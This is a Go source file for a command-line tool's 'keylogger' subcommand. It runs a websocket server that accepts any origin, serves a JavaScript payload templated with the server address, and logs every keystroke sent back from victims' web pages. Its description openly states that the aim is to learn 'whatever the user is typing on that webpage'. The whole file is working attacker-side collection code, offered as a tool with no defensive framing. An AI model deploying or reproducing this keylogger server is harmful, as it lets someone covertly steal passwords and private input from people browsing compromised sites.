package cmd

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"text/template"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/spf13/cobra"
)

var (
	wsAddr       string
	listenerPort string
	upgrader     = websocket.Upgrader{
		// TODO: Only selected origins should be allowed
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}
	jsTemplate *template.Template
	err        error
)
var KeyCmd = &cobra.Command{
	Use:   "keylogger",
	Short: "Run server to capture keystrokes from web client",
	Long: `This will run a keylogger server (a websocket) which also renders
	a HTML (with JS) client that captures the keystrokes and send them to
	this server, so we can know whatever the user is typing on that webpage`,
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println("The address of websocket server: ", wsAddr)
		fmt.Println("The port on which server is running: ", listenerPort)
		router := mux.NewRouter()
		router.HandleFunc("/js", serveJS)
		router.HandleFunc("/ws", wsServer)
		router.HandleFunc("/hello", func(w http.ResponseWriter,
			r *http.Request) {
			fmt.Println("Running in hello")
			if _, err := w.Write([]byte("hi")); err != nil {
				fmt.Println(err)
				http.Error(w, err.Error(), 500)
				return
			}
		})
		log.Fatal(http.ListenAndServe(":"+listenerPort, router))

	},
}

func init() {
	rootCmd.AddCommand(KeyCmd)
	KeyCmd.Flags().StringVarP(&wsAddr, "ws-addr", "w", "localhost:8192", "address of the websocket server")
	KeyCmd.Flags().StringVarP(&listenerPort, "listener-port", "l", "8192", `
	The port at which the listener server should run on this machine
	`)
	jsTemplate, err = template.ParseFiles("static/logger.js")
	if err != nil {
		log.Fatal(err)
	}
}

func wsServer(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(
		w,
		r,
		nil,
	)
	if err != nil {
		http.Error(
			w,
			"Unable to upgrade the connection from HTTP to WS",
			500,
		)
		return
	}
	defer conn.Close()
	fmt.Println("Connection from: ", conn.RemoteAddr().String())
	for {
		_, body, err := conn.ReadMessage()
		if err != nil {
			if err == io.EOF {
				fmt.Println("Message end")
				return
			}
			fmt.Println("Unable to read from ws conn: ", err)
			return
		}
		fmt.Printf("Message from %s: %s \n",
			conn.RemoteAddr().String(),
			body,
		)
	}
}

func serveJS(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Serving the javascript file")
	w.Header().Set(
		"Content-Type",
		"application/javascript",
	)
	if err := jsTemplate.Execute(w, wsAddr); err != nil {
		fmt.Println(err)
		http.Error(w,
			fmt.Sprintf("Error in executing js template", err),
			500)
		return
	}
}
